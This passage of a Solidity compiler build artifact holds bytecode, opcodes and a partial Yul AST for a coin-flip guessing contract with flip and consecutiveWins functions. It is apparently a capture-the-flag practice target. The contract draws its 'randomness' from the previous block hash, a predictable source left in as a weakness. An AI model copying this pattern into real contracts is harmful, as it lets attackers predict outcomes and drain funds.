jump\t// in\n    tag_82:\n        /* \"#utility.yul\":2714:2749   */\n    tag_81:\n        /* \"#utility.yul\":2771:2772   */\n      dup3\n        /* \"#utility.yul\":2768:2769   */\n      dup3\n        /* \"#utility.yul\":2764:2773   */\n      div\n        /* \"#utility.yul\":2759:2773   */\n      swap1\n      pop\n        /* \"#utility.yul\":2594:2779   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220482a8f1b0bdf0f239afa5679974bb9be95f3f3c7b90e3def45056861dddd664664736f6c634300080d0033\n}\n",
						"bytecode": {
							"functionDebugData": {
								"@_20": {
									"entryPoint": null,
									"id": 20,
									"parameterSlots": 0,
									"returnSlots": 0
								}
							},
							"generatedSources": [],
							"linkReferences": {},
							"object": "60806040527f800000000000000000000000000000000000000000000000000000000000000060025534801561003457600080fd5b50600080819055506103678061004b6000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c80631d263f671461003b578063e6f334d71461006b575b600080fd5b6100556004803603810190610050919061019b565b610089565b60405161006291906101d7565b60405180910390f35b61007361012c565b604051610080919061020b565b60405180910390f35b6000806100a060014361013290919063ffffffff16565b4060001c905080600154036100b457600080fd5b8060018190555060006100d26002548361014890919063ffffffff16565b90506000600182146100e55760006100e8565b60015b9050841515811515036101185760008081548092919061010790610255565b919050555060019350505050610127565b60008081905550600093505050505b919050565b60005481565b60008183610140919061029d565b905092915050565b600081836101569190610300565b905092915050565b600080fd5b60008115159050919050565b61017881610163565b811461018357600080fd5b50565b6000813590506101958161016f565b92915050565b6000602082840312156101b1576101b061015e565b5b60006101bf84828501610186565b91505092915050565b6101d181610163565b82525050565b60006020820190506101ec60008301846101c8565b92915050565b6000819050919050565b610205816101f2565b82525050565b600060208201905061022060008301846101fc565b92915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b6000610260826101f2565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff820361029257610291610226565b5b600182019050919050565b60006102a8826101f2565b91506102b3836101f2565b9250828210156102c6576102c5610226565b5b828203905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b600061030b826101f2565b9150610316836101f2565b925082610326576103256102d1565b5b82820490509291505056fea2646970667358221220482a8f1b0bdf0f239afa5679974bb9be95f3f3c7b90e3def45056861dddd664664736f6c634300080d0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH32 0x8000000000000000000000000000000000000000000000000000000000000000 PUSH1 0x2 SSTORE CALLVALUE DUP1 ISZERO PUSH2 0x34 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x0 DUP1 DUP2 SWAP1 SSTORE POP PUSH2 0x367 DUP1 PUSH2 0x4B PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x1D263F67 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0xE6F334D7 EQ PUSH2 0x6B JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x55 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x50 SWAP2 SWAP1 PUSH2 0x19B JUMP JUMPDEST PUSH2 0x89 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x62 SWAP2 SWAP1 PUSH2 0x1D7 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x73 PUSH2 0x12C JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x80 SWAP2 SWAP1 PUSH2 0x20B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 PUSH2 0xA0 PUSH1 0x1 NUMBER PUSH2 0x132 SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST BLOCKHASH PUSH1 0x0 SHR SWAP1 POP DUP1 PUSH1 0x1 SLOAD SUB PUSH2 0xB4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 PUSH1 0x1 DUP2 SWAP1 SSTORE POP PUSH1 0x0 PUSH2 0xD2 PUSH1 0x2 SLOAD DUP4 PUSH2 0x148 SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH1 0x1 DUP3 EQ PUSH2 0xE5 JUMPI PUSH1 0x0 PUSH2 0xE8 JUMP JUMPDEST PUSH1 0x1 JUMPDEST SWAP1 POP DUP5 ISZERO ISZERO DUP2 ISZERO ISZERO SUB PUSH2 0x118 JUMPI PUSH1 0x0 DUP1 DUP2 SLOAD DUP1 SWAP3 SWAP2 SWAP1 PUSH2 0x107 SWAP1 PUSH2 0x255 JUMP JUMPDEST SWAP2 SWAP1 POP SSTORE POP PUSH1 0x1 SWAP4 POP POP POP POP PUSH2 0x127 JUMP JUMPDEST PUSH1 0x0 DUP1 DUP2 SWAP1 SSTORE POP PUSH1 0x0 SWAP4 POP POP POP POP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 DUP2 DUP4 PUSH2 0x140 SWAP2 SWAP1 PUSH2 0x29D JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 DUP4 PUSH2 0x156 SWAP2 SWAP1 PUSH2 0x300 JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x178 DUP2 PUSH2 0x163 JUMP JUMPDEST DUP2 EQ PUSH2 0x183 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x195 DUP2 PUSH2 0x16F JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x1B1 JUMPI PUSH2 0x1B0 PUSH2 0x15E JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x1BF DUP5 DUP3 DUP6 ADD PUSH2 0x186 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x1D1 DUP2 PUSH2 0x163 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1EC PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x1C8 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x205 DUP2 PUSH2 0x1F2 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x220 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x1FC JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x260 DUP3 PUSH2 0x1F2 JUMP JUMPDEST SWAP2 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 SUB PUSH2 0x292 JUMPI PUSH2 0x291 PUSH2 0x226 JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2A8 DUP3 PUSH2 0x1F2 JUMP JUMPDEST SWAP2 POP PUSH2 0x2B3 DUP4 PUSH2 0x1F2 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 LT ISZERO PUSH2 0x2C6 JUMPI PUSH2 0x2C5 PUSH2 0x226 JUMP JUMPDEST JUMPDEST DUP3 DUP3 SUB SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x30B DUP3 PUSH2 0x1F2 JUMP JUMPDEST SWAP2 POP PUSH2 0x316 DUP4 PUSH2 0x1F2 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x326 JUMPI PUSH2 0x325 PUSH2 0x2D1 JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 BASEFEE 0x2A DUP16 SHL SIGNEXTEND 0xDF 0xF 0x23 SWAP11 STATICCALL JUMP PUSH26 0x974BB9BE95F3F3C7B90E3DEF45056861DDDD664664736F6C6343 STOP ADDMOD 0xD STOP CALLER ",
							"sourceMap": "65:728:0:-:0;;;194:77;177:94;;278:53;;;;;;;;;;324:1;306:15;:19;;;;65:728;;;;;;"
						},
						"deployedBytecode": {
							"functionDebugData": {
								"@consecutiveWins_7": {
									"entryPoint": 300,
									"id": 7,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"@div_376": {
									"entryPoint": 328,
									"id": 376,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"@flip_86": {
									"entryPoint": 137,
									"id": 86,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"@sub_346": {
									"entryPoint": 306,
									"id": 346,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_decode_t_bool": {
									"entryPoint": 390,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_decode_tuple_t_bool": {
									"entryPoint": 411,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_t_bool_to_t_bool_fromStack": {
									"entryPoint": 456,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_encode_t_uint256_to_t_uint256_fromStack": {
									"entryPoint": 508,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed": {
									"entryPoint": 471,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed": {
									"entryPoint": 523,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"allocate_unbounded": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 1
								},
								"checked_div_t_uint256": {
									"entryPoint": 768,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"checked_sub_t_uint256": {
									"entryPoint": 669,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"cleanup_t_bool": {
									"entryPoint": 355,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_uint256": {
									"entryPoint": 498,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"increment_t_uint256": {
									"entryPoint": 597,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"panic_error_0x11": {
									"entryPoint": 550,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"panic_error_0x12": {
									"entryPoint": 721,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b": {
									"entryPoint": 350,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"validator_revert_t_bool": {
									"entryPoint": 367,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 0
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:2782:3",
										"statements": [
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "47:35:3",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "57:19:3",
															"value": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "73:2:3",
																		"type": "",
																		"value": "64"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "67:5:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "67:9:3"
															},
															"variableNames": [
																{
																	"name": "memPtr",
																	"nodeType": "YulIdentifier",
																	"src": "57:6:3"
																}
															]
														}
													]
												},
												"name": "allocate_unbounded",
												"nodeType": "YulFunctionDefinition",
												"returnVariables": [
													{
														"name": "memPtr",
														"nodeType": "YulTypedName",
														"src": "40:6:3",
														"type": ""
													}
												],
												"src": "7:75:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "177:28:3",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "194:1:3",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "197:1:3",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "187:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "187:12:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "187:12:3"
														}
													]
												},
												"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
												"nodeType": "YulFunctionDefinition",
												"src": "88:117:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "300:28:3",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "317:1:3",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "320:1:3",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "310:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "310:12:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "310:12:3"
														}
													]
												},
												"name": "revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db",
												"nodeType": "YulFunctionDefinition",
												"src": "211:117:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "376:48:3",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "386:32:3",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "411:5:3"
																			}
																		],
																		"functionName": {
																			"name": "iszero",
																			"nodeType": "YulIdentifier",
																			"src": "404:6:3"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "404:13:3"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "397:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "397:21:3"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "386:7:3"
																}
															]
														}
													]
												},
												"name": "cleanup_t_bool",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "358:5:3",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "368:7:3",
														"type": ""
													}
												],
												"src": "334:90:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "470:76:3",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "524:16:3",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "533:1:3",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "536:1:3",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "526:6:3"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "526:12:3"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "526:12:3"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "493:5:3"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nodeType": "YulIdentifier",
																						"src": "515:5:3"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_bool",
																					"nodeType": "YulIdentifier",
																					"src": "500:14:3"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "500:21:3"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nodeType": "YulIdentifier",
																			"src": "490:2:3"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "490:32:3"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "483:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "483:40:3"
															},
															"nodeType": "YulIf",
															"src": "480:60:3"
														}
													]
												},
												"name": "validator_revert_t_bool",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "463:5:3",
														"type": ""
													}
												],
												"src": "430:116:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "601:84:3",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "611:29:3",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nodeType": "YulIdentifier",
																		"src": "633:6:3"
																	}
																],
																"functionName": {
																	"name": "calldataload",
																	"nodeType": "YulIdentifier",
																	"src": "620:12:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "620:20:3"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nodeType": "YulIdentifier",
																	"src": "611:5:3"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "673:5:3"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_bool",
																	"nodeType": "YulIdentifier",
																	"src": "649:23:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "649:30:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "649:30:3"
														}
													]
												},
												"name": "abi_decode_t_bool",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nodeType": "YulTypedName",
														"src": "579:6:3",
														"type": ""
													},
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "587:3:3",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "595:5:3",
														"type": ""
													}
												],
												"src": "552:133:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "754:260:3",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "800:83:3",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
																				"nodeType": "YulIdentifier",
																				"src": "802:77:3"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "802:79:3"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "802:79:3"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "775:7:3"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "784:9:3"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "771:3:3"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "771:23:3"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "796:2:3",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nodeType": "YulIdentifier",
																	"src": "767:3:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "767:32:3"
															},
															"nodeType": "YulIf",
															"src": "764:119:3"
														},
														{
															"nodeType": "YulBlock",
															"src": "893:114:3",
															"statements": [
																{
																	"nodeType": "YulVariableDeclaration",
																	"src": "908:15:3",
																	"value": {
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "922:1:3",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nodeType": "YulTypedName",
																			"src": "912:6:3",
																			"type": ""
																		}
																	]
																},
																{
																	"nodeType": "YulAssignment",
																	"src": "937:60:3",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nodeType": "YulIdentifier",
																						"src": "969:9:3"
																					},
																					{
																						"name": "offset",
																						"nodeType": "YulIdentifier",
																						"src": "980:6:3"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nodeType": "YulIdentifier",
																					"src": "965:3:3"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "965:22:3"
																			},
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "989:7:3"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_bool",
																			"nodeType": "YulIdentifier",
																			"src": "947:17:3"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "947:50:3"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nodeType": "YulIdentifier",
																			"src": "937:6:3"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_bool",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "724:9:3",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nodeType": "YulTypedName",
														"src": "735:7:3",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "747:6:3",
														"type": ""
													}
												],
												"src": "691:323:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1079:50:3",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "1096:3:3"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "1116:5:3"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_bool",
																			"nodeType": "YulIdentifier",
																			"src": "1101:14:3"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1101:21:3"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1089:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "1089:34:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1089:34:3"
														}
													]
												},
												"name": "abi_encode_t_bool_to_t_bool_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1067:5:3",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "1074:3:3",
														"type": ""
													}
												],
												"src": "1020:109:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1227:118:3",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1237:26:3",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "1249:9:3"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1260:2:3",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "1245:3:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "1245:18:3"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "1237:4:3"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "1311:6:3"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1324:9:3"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1335:1:3",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "1320:3:3"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1320:17:3"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_bool_to_t_bool_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "1273:37:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "1273:65:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1273:65:3"
														}
													]
												},
												"name": "abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "1199:9:3",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "1211:6:3",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "1222:4:3",
														"type": ""
													}
												],
												"src": "1135:210:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1396:32:3",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1406:16:3",
															"value": {
																"name": "value",
																"nodeType": "YulIdentifier",
																"src": "1417:5:3"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "1406:7:3"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1378:5:3",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "1388:7:3",
														"type": ""
													}
												],
												"src": "1351:77:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1499:53:3",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "1516:3:3"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "1539:5:3"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_uint256",
																			"nodeType": "YulIdentifier",
																			"src": "1521:17:3"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1521:24:3"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1509:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "1509:37:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1509:37:3"
														}
													]
												},
												"name": "abi_encode_t_uint256_to_t_uint256_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1487:5:3",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "1494:3:3",
														"type": ""
													}
												],
												"src": "1434:118:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1656:124:3",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1666:26:3",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "1678:9:3"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1689:2:3",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "1674:3:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "1674:18:3"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "1666:4:3"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "1746:6:3"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1759:9:3"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1770:1:3",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "1755:3:3"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1755:17:3"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_uint256_to_t_uint256_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "1702:43:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "1702:71:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1702:71:3"
														}
													]
												},
